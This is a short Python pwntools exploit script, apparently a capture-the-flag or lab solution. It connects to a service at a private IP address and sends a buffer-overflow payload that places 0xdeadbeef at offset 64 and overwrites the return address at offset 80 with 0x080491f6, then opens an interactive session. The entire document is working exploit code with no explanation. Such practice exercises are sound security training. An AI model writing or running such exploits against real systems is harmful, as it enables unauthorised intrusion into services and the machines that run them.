from pwn import *
io = remote("192.168.23.61", 20027)

payload=fit({
    64: 0xdeadbeef,
    80: 0x080491f6
})


io.sendline(payload)
io.interactive()